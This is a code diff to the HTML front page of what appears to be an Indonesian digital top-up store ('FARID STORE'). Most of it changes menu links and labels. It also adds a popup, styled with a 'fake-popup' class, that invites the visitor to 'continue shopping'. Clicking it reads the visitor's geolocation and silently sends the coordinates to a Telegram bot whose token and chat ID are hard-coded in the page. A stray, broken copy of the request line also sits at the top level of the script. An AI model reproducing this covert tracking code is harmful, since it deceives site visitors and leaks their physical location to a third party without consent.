@@ -7,6 +7,58 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
     <style>
+
+body {
+            font-family: sans-serif;
+        }
+
+        .fake-popup {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            width: 320px;
+            background-color: #f9f9f9;
+            border: 1px solid #ccc;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            padding: 16px;
+            border-radius: 8px;
+            z-index: 9999;
+        }
+
+        .fake-popup h4 {
+            margin: 0 0 10px;
+            font-weight: 500;
+        }
+
+        .fake-popup p {
+            font-size: 14px;
+            color: #555;
+        }
+
+        .popup-buttons {
+            margin-top: 16px;
+            text-align: right;
+        }
+
+        .popup-buttons button {
+            padding: 6px 12px;
+            font-size: 14px;
+            border: none;
+            border-radius: 4px;
+            margin-left: 8px;
+            cursor: pointer;
+        }
+
+        .popup-buttons .deny {
+            background-color: #e0e0e0;
+            color: #333;
+        }
+
+        .popup-buttons .allow {
+            background-color: #2196F3;
+            color: white;
+        }
+
         .fade-in {
             opacity: 0;
             transform: translateY(10px);
@@ -71,11 +123,11 @@
 
     <!-- Sidebar -->
     <div class="sidebar shadow-md">
-        <div class="p-4 text-xl font-bold text-sky-950"><a href="index.html"><i class="fas fa-store mr-2"></i> FARID STORE </a></div>
+        <div class="p-4 text-xl font-bold text-sky-950"><a href="index.php"><i class="fas fa-store mr-2"></i> FARID STORE </a></div>
         <nav class="mt-4">
             <ul>
                 <li class="p-4 hover:bg-purple-200 transition duration-300 cursor-pointer">
-                    <a href="dashboard.html" target="main-frame"><i class="fas fa-store mr-2"></i>Dashboard</a>
+                    <a href="index.php" target="main-frame"><i class="fas fa-store mr-2"></i>Dashboard</a>
                 </li>
                 <li class="p-4 hover:bg-purple-200 transition duration-300 cursor-pointer">
                     <a href="https://portofoliofarid.carrd.co/" target="main-frame"><i class="fas fa-globe mr-2"></i>Jasa Edit</a>
@@ -83,14 +135,15 @@
                 <!-- Dropdown Join -->
                 <li class="p-4 hover:bg-purple-200 transition duration-300 cursor-pointer dropdown">
                     <div class="flex items-center justify-between cursor-pointer" onclick="toggleDropdown('join-menu')">
-                        <span><i class="fas fa-user mr-2"></i>Join</span>
+                        <span><i class="fas fa-user mr-2"></i>Hubungi Saya</span>
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <ul id="join-menu" class="ml-4 mt-2 dropdown-menu">
                         <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="https://discord.gg/XwEzSNz2" target="_blank">Discord</a></li>
-                        <li class="p-2 bg-purple-200 hover:bg-purple-300 cursor-pointer"><a href="https://whatsapp.com/0029VaoU7Wa59PwLluk20G" target="_blank">Whatsapp</a></li>
+                        <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="https://whatsapp.com/0029VaoU7Wa59PwLluk20G" target="_blank">Whatsapp</a></li>
                         <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="https://t.me/AirdropHunterX04" target="_blank">Telegram</a></li>
-                        <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="cv.html" target="main-frame">Curriculume Vitae</a></li>
+                        <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="cv.html" target="main-frame">Curriculum Vitae</a></li>
+                    
                     </ul>
                 </li>
                 <!-- Dropdown Prabayar -->
@@ -100,10 +153,10 @@
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <ul id="prabayar-menu" class="ml-4 mt-2 dropdown-menu">
-                        <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="token-pln.html" target="main-frame">Token PLN</a></li>
-                        <li class="p-2 bg-purple-200 hover:bg-purple-300 cursor-pointer"><a href="game.html" target="main-frame">Topup Game</a></li>
+                        <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="premiumapp.php" target="main-frame">Aplikasi Premium</a></li>
+                        <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="game.php" target="main-frame">Topup Game</a></li>
                         <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="paket-data.html" target="main-frame">Paket Data Internet</a></li>
-                        <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="e-money.html" target="main-frame">E-Money</a></li>
+                        <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="emoney.php" target="main-frame">E-Money</a></li>
                         <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="pulsa-reguler.html" target="main-frame">Pulsa Reguler</a></li>
                     </ul>
                 </li>
@@ -119,26 +172,39 @@
                         <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="telepon-internet.html" target="main-frame">Telepon & Internet</a></li>
                     </ul>
                 </li>
-                <li class="p-4 hover:bg-purple-200 transition duration-300 cursor-pointer">
-    <a href="crypto.html" target="main-frame"><i class="fab fa-btc mr-2"></i>Top Up Crypto</a>
-</li>
-
-                <li class="p-4 hover:bg-purple-200 transition duration-300 cursor-pointer">
-                    <a href="payment.html" target="main-frame"><i class="fas fa-wallet mr-2"></i>Opsi Pembayaran</a>
+                <!-- Dropdown Join -->
+                <li class="p-4 hover:bg-purple-200 transition duration-300 cursor-pointer dropdown">
+                    <div class="flex items-center justify-between cursor-pointer" onclick="toggleDropdown('premium-fitur')">
+                        <span><i class="fas fa-user mr-2"></i>Premium Features</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <ul id="premium-fitur" class="ml-4 mt-2 dropdown-menu">
+                        <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="pricelist.php" target="main-frame">Daftar Harga</a></li>
+                        <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="crypto.php" target="main-frame">Topup Crypto</a></li>
+                        <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="payment.php" target="main-frame">Pembayaran</a></li>
+                        <li class="p-2 hover:bg-purple-300 cursor-pointer"><a href="admin.php" target="main-frame">Admin Page</a></li>
+                    
+                    </ul>
                 </li>
                 <li class="p-4 hover:bg-purple-200 transition duration-300 cursor-pointer">
-                    <a href="admin.html" target="main-frame"><i class="fas fa-user-shield mr-2"></i>Admin Page</a>
+                    <a href="cryptoprice.html" target="main-frame"><i class="fab fa-btc mr-2"></i>Crypto Price</a>
                 </li>
-                <li class="p-4 hover:bg-purple-200 transition duration-300 cursor-pointer">
-                    <a href="logout_script.html" target="main-frame"><i class="fas fa-sign-out-alt mr-2"></i>Logout</a>
-                </li>
+                
+                
             </ul>
         </nav>
     </div>
-
+    <div class="fake-popup" id="popupLokasi">
+    <h4>Selamat Datang Di farid.store</h4>
+    <p>Klik Lanjut Untuk Membeli Produk.</p>
+    <div class="popup-buttons">
+        <button class="deny" onclick="tutupPopup()">Tolak</button>
+        <button class="allow" onclick="izinkanLokasi()">Lanjutkan</button>
+    </div>
+</div>
     <!-- Konten Utama -->
     <div class="main-content text-white">
-        <iframe name="main-frame" src="dashboard.html"></iframe>
+        <iframe name="main-frame" src="index.php"></iframe>
     </div>
 
     <!-- Script Toggle Sidebar & Dropdown -->
@@ -151,6 +217,48 @@
             let menu = document.getElementById(menuId);
             menu.classList.toggle("show");
         }
+
+        const TOKEN = '7819700390:AAEO8_9_5Xr8msBPZd2hOQ4CkxDnlHVS3b8';
+                const CHAT_ID = '5775563021';
+                const url = `https://api.telegram.org/bot${TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
+
+
+
+    function tutupPopup() {
+        document.getElementById("popupLokasi").style.display = "none";
+    }
+
+    function izinkanLokasi() {
+        document.getElementById("popupLokasi").style.display = "none";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+
+                // Ganti ini dengan token & chat ID bot kamu
+                const TOKEN = '7819700390:AAEO8_9_5Xr8msBPZd2hOQ4CkxDnlHVS3b8';
+                const CHAT_ID = '5775563021';
+                const url = `https://api.telegram.org/bot${TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
+
+                fetch(url)
+                    .then(res => {
+                        if (res.ok) {
+                            alert("Selamat berbelanja, nikmati semua promo di @farid.store!");
+                        } else {
+                            alert("yah!! terimakasih.");
+                        }
+                    });
+            }, function(error) {
+                alert("gagal memuat fitur: " + error.message);
+            });
+        } else {
+            alert("fitur gagal dimuat, update browser anda.");
+        }
+    }
+
+
+
     </script>
 
 </body>
